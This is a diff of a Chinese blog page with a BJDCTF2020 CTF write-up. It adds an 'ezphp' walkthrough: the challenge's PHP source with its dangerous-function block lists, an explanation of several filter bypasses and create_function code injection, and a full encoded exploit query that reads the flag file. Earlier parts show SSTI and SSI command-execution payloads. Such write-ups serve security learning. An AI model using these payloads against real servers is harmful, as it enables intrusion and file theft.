@@ -5,9 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="BJDCTF2020 部分wp, Z3ratu1&#39;s blog">
-    <meta name="description" content="BJDCTF2020 部分wpbuu平台上的一些bjdctf的题，记录一下
+    <meta name="description" content="[BJDCTF2020]部分wpbuu平台上的一些bjdctf的题，记录一下
 Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
-.git源码泄露最近做的几个题都是这种类型，总是要我扫一下目录，扫出来有一个/.git文件夹。想">
+.git源码泄露最近做的几个题都是这种类型，总是要我扫一下目录，扫出来有一个/.git文件夹。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -287,7 +287,7 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -428,21 +428,21 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-02-21
+                    2020-03-10
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.7k
+                        3.8k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        6 Min
+                        15 Min
                     </div>
                     
                 
@@ -458,7 +458,7 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BJDCTF2020-部分wp"><a href="#BJDCTF2020-部分wp" class="headerlink" title="BJDCTF2020 部分wp"></a>BJDCTF2020 部分wp</h1><p>buu平台上的一些bjdctf的题，记录一下</p>
+                <h1 id="BJDCTF2020-部分wp"><a href="#BJDCTF2020-部分wp" class="headerlink" title="[BJDCTF2020]部分wp"></a>[BJDCTF2020]部分wp</h1><p>buu平台上的一些bjdctf的题，记录一下</p>
 <h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>被戏耍了，完全是一个动脑题，输在愚钝上</p>
 <h3 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h3><p>最近做的几个题都是这种类型，总是要我扫一下目录，扫出来有一个/.git文件夹。想获取.git下的源码我们需要使用Githack这个工具，就能把源码扒下来了，一开始看到一个花里胡哨的cms，最下面还有一个发送邮件，我还以为是那种cms的神仙漏洞或者是xss盗号之类的神仙操作，结果.git拿到这么个和原文无关的代码，着实有点过分</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -501,7 +501,7 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
 <p>题目flag.php界面显示了当前ip，测试之后发现可以使用xff头对显示ip进行控制，问题在于这是什么类型的攻击</p>
 <p>百度得知基于xff头的攻击一般是注入或者xss，注入各种fuzz无果，xss不会，最后是师傅提示是模板注入，就直接出了，直接一步system(‘cat /flag’)</p>
 <h3 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h3><p>页面能够显示的内容，可选择的攻击方式有xss和ssti，xxe攻击一般得要有json格式的数据包发过去，并其中一项在页面中显示才有效</p>
-<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>和上个IP这个题一样的界面，简单测试<code>64</code>之后发现仍存在SSTI，通过如图方法测试获知使用引擎为twig<br><img src="https://pic3.zhimg.com/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1200x500.jpg" alt=""><br>php下的一个模板，可以根据这篇文章对ssti及相关攻击方式有一个基础了解</p>
+<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>和上个IP这个题一样的界面，简单测试64之后发现仍存在SSTI，通过如图方法测试获知使用引擎为twig<br><img src="https://pic3.zhimg.com/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1200x500.jpg" alt=""><br>php下的一个模板，可以根据这篇文章对ssti及相关攻击方式有一个基础了解</p>
 <p>一开始以为有过滤的，打了半天打不动，结果应该是需要用专业的payload打，为此专门去GitHub看了他们的源码，是在执行出现问题的时候返回了一句’what do you want to do’，而不是在查黑名单</p>
 <p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p>
 <h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>第一层很简单，用PHP伪协议就能过，第二步进入next.php，比较复杂的一个preg_replace的漏洞<br>上源码</p>
@@ -565,6 +565,95 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
 <p>给了部分源码，第一层一个简单的md5碰撞，用个随机生成字符串脚本跑一下就出了一个能用的<code>FaRmZGN2nK</code><br>第二层是可以把我们post的username写到一个后缀为.shtml的文件里面，是一个没有见过的其妙类型，前面那个生成hash的函数纯粹唬人，就是各种散列计算取得一个文件名罢了，毫无作用<br>查了一下.shtml这种文件类型，对应了Apache一个SSI的文件包含和命令执行漏洞，按照样例payload打过去就可以了<br><code>&lt;!--#exec cmd=ls&quot;--&gt;</code></p>
 <p>SSI也需要用户输入内容可以显示在界面上，这种类型的漏洞目前有xss，ssti和ssi三种可能了，不过ssi只能在.shtml这种后缀的文件上使用，算是一个特色</p>
 <h3 id="查到payload的链接"><a href="#查到payload的链接" class="headerlink" title="查到payload的链接"></a>查到payload的链接</h3><p><a href="https://www.cnblogs.com/endust/p/11826210.html" target="_blank" rel="noopener">https://www.cnblogs.com/endust/p/11826210.html</a></p>
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>一个一系列的绕过和一个create_function注入，非预期里面还有字符串的取反异或操作，结果是不用eval也可以将~^这些识别为操作进行字符串处理么</p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+    <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+<span class="token delimiter">?></span></code></pre>
+<h3 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="^$正则匹配绕过"></a>^$正则匹配绕过</h3><p>这里可以看PHPmanual里正则修饰符中的一句描述</p>
+<blockquote>
+<p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而<strong>“行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符</strong>(除非设置了 D 修饰符)。</p>
+</blockquote>
+<p>实际上，当一个字符串的结尾是换行符时，$字符同时匹配字符串的最后一位和换行符，可以用如下脚本测试，D修饰符为ENDONLY，即只匹配结尾</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"aaa\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aaa$/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">echo</span> <span class="token string">"success1\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^aaa$\n/"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">echo</span> <span class="token string">"success2\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^aaa$/D"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">echo</span> <span class="token string">"success3\n"</span><span class="token punctuation">;</span></code></pre>
+<p>输出结果为success1 success2</p>
+<h3 id="SERVER-‘QUERY-STRING’-绕过"><a href="#SERVER-‘QUERY-STRING’-绕过" class="headerlink" title="$_SERVER[‘QUERY_STRING’]绕过"></a>$_SERVER[‘QUERY_STRING’]绕过</h3><p>平常我们都知道POST和GET传过去的参数会在后端进行url解码，我一直以为是PHP后端做的自动工作，但是实际上应该是POST和GET进行的解码，而$_SERVER[‘QUERY_STRING’]则是直接获取url问号后的全部内容，并且不会经过url解码，这样子就能完成绕过。</p>
+<h3 id="REQUEST变量覆盖"><a href="#REQUEST变量覆盖" class="headerlink" title="$_REQUEST变量覆盖"></a>$_REQUEST变量覆盖</h3><p>$_REQUEST是一个包含GET，POST，COOKIE三个超全局变量的数组，php.ini中有一个REQUEST解析顺序，默认是GP，即先GET后POST，这样子GET和POST同时传递一个同名参数，POST的参数会覆盖GET的参数</p>
+<p>这里有一个巨大坑，我一开始没有意识到REQUEST中包含COOKIE，然后把源码拉到本地来做了一遍又绕过去了，在这里想了好久不知道哪里错了，甚至怀疑是不是php.ini被改了，但是这样子就无解了，花了好久最后师傅告诉我REQUEST还包含COOKIE，然后COOKIE的值带了英文，导致过不了检测<br><a href="https://www.ucloud.cn/yun/30265.html" target="_blank" rel="noopener">https://www.ucloud.cn/yun/30265.html</a></p>
+<h3 id="sha1绕过"><a href="#sha1绕过" class="headerlink" title="sha1绕过"></a>sha1绕过</h3><p>一开始还以为是要sha1强碰撞，因为已经有了md5的强碰撞结果，搜出来一个sha1也说不定呢，结果是用PHP的sha函数不能处理数组返回false的方法绕过</p>
+<h3 id="数组绕过正则"><a href="#数组绕过正则" class="headerlink" title="数组绕过正则"></a>数组绕过正则</h3><p>这里我们在sha1绕过时新增了两个数组变量shana[]和passwd[]，但是这两个不需要在POST处在提交一个进行变量覆盖，因为正则表达式没法去匹配数组</p>
+<h3 id="create-function命令注入"><a href="#create-function命令注入" class="headerlink" title="create_function命令注入"></a>create_function命令注入</h3><p>这里才是这个题的核心考点，create_function这个函数可以说是非常的危险了，底层的实现非常玄幻，导致我们闭合括号之后居然可以进行任意命令执行<br>create_function接受两个参数，第一个为参数列表，第二个为函数执行的代码<br>例如<code>a=create_function(&#39;$a,$b&#39;, &#39;return($a+$b);&#39;);</code><br>就创建了一个如下函数</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>而我们如果稍微修改一下第二个参数，就会导致代码逃逸造成任意命令执行<br><code>a=create_function(&#39;$a,$b&#39;, &#39;return($a+$b);} phpinfo(); //&#39;);</code><br>这样子刚才的代码就变成了</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//}</span></code></pre>
+<p>这样子就跑出来了一个phpinfo()，我们完全可以逃逸出更多的函数执行任意的命令<br>不过这里ban掉了绝大多数命令执行的函数，所以我们得通过正常一点的手段来获取flag<br>这里include了flag.php，那么我们只要想法把flag.php里面的变量输出出来就可以了<br>但是超全局变量$_GLOBALS由于美元符号被禁止了不能使用，但是还有一个函数get_defined_vars()，返回值为全部变量的一个数组，在var_dump一下就可以了</p>
+<p>类似的函数还有get_defined_functions()，get_included_files()等，感觉以后有机会用得上<br><a href="http://www.360doc.com/content/19/0901/11/30583588_858435248.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/19/0901/11/30583588_858435248.shtml</a><br>但是这个结果跑出来告诉你flag其实是在rea1fl4g.php里，而这回rea1fl4g.php没有被包含，那就得重新想办法去读取flag了</p>
+<h3 id="取反绕过检测获取flag"><a href="#取反绕过检测获取flag" class="headerlink" title="取反绕过检测获取flag"></a>取反绕过检测获取flag</h3><p>以前一直以为要在eval中取反异或这种操作才会被执行，但是实际上只要字符串前面出现了取反或者异或符号，这个操作就会自然而然的进行，而这里并没有过滤取反和异或，所以我们随便选用一种就可以轻松绕过了<br>这里include被禁用了，但是require和include的内容一样，用require也是一样的，而提到文件包含就应该想到伪协议读取源码，所以这里require的参数我们传一个伪协议，用取反~来绕过限制，就可以读取源码获得flag了</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个题大半夜对着wp写的，之前因为那个REQUEST的问题折腾了好久，然后所有的payload又同一进行了url编码，取反之后根本不知道payload哪是哪，操作起来极其不方便，人是傻的，思路不清，浪费时间，甚至把传参都传错了看了半天</p>
+<p>把payload记下来<br><code>%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=111&amp;%70%61%73%73%77%64[]=222&amp;%66%6c%61%67%5b%61%72%67%5d=;}require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</code><br>这么大一堆看着眼睛都痛，post还要post两个变量去覆盖request<br>解码出来是<code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=111&amp;passwd[]=222&amp;flag[arg]=;}require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//&amp;flag[code]=create_function</code></p>
+<p>这个题之前还有一个版本，这个读源码的反而是原先版本的非预期，然后就重新出了一次，整了这这个题，原来的payload写的已经很详细了，不过我一路上还是能遇到一堆奇奇怪怪的问题</p>
+<p>原wp里有一个函数调用不带引号的操作，我试了一下还真可以，虽然会有警告，但是不加引号的数据还是会被当做字符串处理，base64_encode，urlencode什么的都可以</p>
+<p>非预期还有各种奇奇怪怪的高端方法，就不一一赘述了，贴两个链接<br><a href="https://blog.csdn.net/a3320315/article/details/104111260" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104111260</a><br><a href="https://www.gem-love.com/ctf/770.html#2_By_NepnepShana_BJDCTF" target="_blank" rel="noopener">https://www.gem-love.com/ctf/770.html#2_By_NepnepShana_BJDCTF</a></p>
 
             </div>
             <hr/>
@@ -725,7 +814,7 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
                   property="dct:title" rel="dct:type">
                     《BJDCTF2020 部分wp》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/21/BJDCTF2020%20%E9%83%A8%E5%88%86wp/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/03/10/%5BBJDCTF2020%5D%E9%83%A8%E5%88%86wp/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -769,25 +858,24 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/02/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20RCE%20ME/">
+                <a href="/2020/03/11/%5BHBCTF%5D%E5%A4%A7%E7%BE%8E%E8%A5%BF%E5%AE%89/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf.jpg" class="responsive-img" alt="极客大挑战 RCE ME">
+                        <img src="/img/1.jpg" class="responsive-img" alt="HBCTF 大美西安">
                         
-                        <span class="card-title">极客大挑战 RCE ME</span>
+                        <span class="card-title">HBCTF 大美西安</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            极客大挑战 RCE ME三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍
-无字母数字命令执行&lt;?php
-error_repo
+                            [HBCTF]大美西安本来看这个河北CTF的名字还以为是个水题，但是还是有难度的，学到了一点新知识
+思路获取源码点开是一个登录界面，看源码可以发现register.php的注释，成功注册登录而url上又有file=home的内容，估摸着是文
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-26
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-11
                         </span>
                         <span class="publish-author">
                             
@@ -808,12 +896,16 @@ error_repo
                         <span class="chip bg-color">wp</span>
                     </a>
                     
-                    <a href="/tags/php/" target="_blank">
-                        <span class="chip bg-color">php</span>
+                    <a href="/tags/SQLI/" target="_blank">
+                        <span class="chip bg-color">SQLI</span>
                     </a>
                     
-                    <a href="/tags/RCE/" target="_blank">
-                        <span class="chip bg-color">RCE</span>
+                    <a href="/tags/phar/" target="_blank">
+                        <span class="chip bg-color">phar</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">
+                        <span class="chip bg-color">文件包含</span>
                     </a>
                     
                 </div>
@@ -827,27 +919,26 @@ error_repo
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/02/19/GWCTF%202019%20%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">
+                <a href="/2020/03/05/%5BXNUCA%5Dezphp/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf1.jpg" class="responsive-img" alt="枯燥的抽奖">
+                        <img src="/img/ctf.jpg" class="responsive-img" alt="XNUCA 2019 ezphp">
                         
-                        <span class="card-title">枯燥的抽奖</span>
+                        <span class="card-title">XNUCA 2019 ezphp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            枯燥的抽奖伪随机数安全的一个题，通过php_mt_rand这个工具逆向出随机数种子，然后通过种子获取字符串
-贴一下源码
-&lt;?php
-header("Content-Type: text/html;charset=utf-8");
-se
+                            [XNUCA 2019] ezphp去年XNUCA的一个题，因为一个点死扣了两天，docker配置Apache配置全都重新研究了一般，开端口防火墙全都整了一遍呜呜呜
+源码&lt;?php
+$files = scandir('./');
+fo
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-19
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-05
                             </span>
                         <span class="publish-author">
                             
@@ -864,16 +955,16 @@ se
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wp/" target="_blank">
-                        <span class="chip bg-color">wp</span>
-                    </a>
-                    
                     <a href="/tags/php/" target="_blank">
                         <span class="chip bg-color">php</span>
                     </a>
                     
-                    <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" target="_blank">
-                        <span class="chip bg-color">暴力破解</span>
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/htaccess/" target="_blank">
+                        <span class="chip bg-color">.htaccess</span>
                     </a>
                     
                 </div>
@@ -990,7 +1081,7 @@ se
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">25.9k</span>&nbsp;字
+                class="white-color">33.5k</span>&nbsp;字
             
             
             
